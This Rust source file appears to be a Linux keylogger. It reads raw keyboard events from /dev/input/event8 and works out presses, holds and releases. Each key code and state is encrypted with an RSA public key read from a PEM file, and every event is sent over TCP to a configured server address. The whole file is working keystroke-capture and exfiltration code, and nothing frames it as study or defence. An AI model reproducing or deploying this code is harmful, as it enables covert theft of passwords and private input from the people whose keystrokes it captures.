use std::collections::HashMap;
use std::fs::OpenOptions;
use std::io::{Read, Write};
use std::net::TcpStream;

use rsa::{PublicKey, RsaPublicKey, pkcs8::DecodePublicKey, PaddingScheme};



static SERVER_ADDRESS:&str = "127.0.0.1";
static SERVER_PORT:i32 = 8080;


#[derive(Debug, Default)]
enum KeyEventState {
    Release,
    #[default] Press,
    Held,
}

#[derive(Debug, Default)]
struct KeyEvent {
    code: u8,
    state: u8,
}

fn main() {
    let mut rng = rand::thread_rng();

    let mut file_options = OpenOptions::new();
            file_options.read(true);
            file_options.write(false);
    let mut file = file_options.open("/dev/input/event8").expect("You fucked up fool");
    let mut pem_file = file_options.open("./public_key.pem").expect("You fucked up fool");
    let mut pem:String = String::from("");
    pem_file.read_to_string(&mut pem).ok();
    let public_key = RsaPublicKey::from_public_key_pem(&pem).unwrap();
    println!("{:?}",public_key);
    let mut read_buffer = [0u8; 24];
    let mut key_buffer= vec!();
    let mut keyevent: KeyEvent;

    let mut held_keys:HashMap<u8, bool>= HashMap::new();

    file_options.read(true);
    file_options.append(true);

    loop {
        file.read(&mut read_buffer).ok();
        key_buffer.push(read_buffer) ;
        if key_buffer.last().unwrap()[18] == 0{
            if key_buffer.len() == 2{
                if held_keys.get(&key_buffer[0][18]) == Some(&false) || held_keys.contains_key(&key_buffer[0][18]) == false {
                    keyevent = KeyEvent{code:key_buffer[0][18], state:2};
                    held_keys.insert(key_buffer[0][18], true);
                    println!("{:?} {:?}",keyevent.code, keyevent.state);
                    let enc_buf = [keyevent.code, keyevent.state];
                    let padding = PaddingScheme::new_pkcs1v15_encrypt();
                    let encrypted_data = public_key.encrypt(&mut rng, padding, &enc_buf[..]).expect("failed to encrypt");
                    let mut stream = TcpStream::connect(format!("{SERVER_ADDRESS}:{}",SERVER_PORT.to_string())).unwrap();
                    stream.write(&encrypted_data).ok();
                }
            }
            else if key_buffer[1][20] == 0 {
                keyevent = KeyEvent{code:key_buffer[1][18], state:0};
                held_keys.insert(key_buffer[1][18], false);
                println!("{:?} {:?}",keyevent.code, keyevent.state);
                let enc_buf = [keyevent.code, keyevent.state];
                let padding = PaddingScheme::new_pkcs1v15_encrypt();
                let encrypted_data = public_key.encrypt(&mut rng, padding, &enc_buf[..]).expect("failed to encrypt");
                let mut stream = TcpStream::connect(format!("{SERVER_ADDRESS}:{}",SERVER_PORT.to_string())).unwrap();
                stream.write(&encrypted_data).ok();
            }
            else {
                keyevent = KeyEvent{code:key_buffer[1][18], state:1};
                println!("{:?} {:?}",keyevent.code, keyevent.state);
                let enc_buf = [keyevent.code, keyevent.state];
                let padding = PaddingScheme::new_pkcs1v15_encrypt();
                let encrypted_data = public_key.encrypt(&mut rng, padding, &enc_buf[..]).expect("failed to encrypt");
                let mut stream = TcpStream::connect(format!("{SERVER_ADDRESS}:{}",SERVER_PORT.to_string())).unwrap();
                stream.write(&encrypted_data).ok();
            }
            key_buffer.clear();  
        }
    }
}
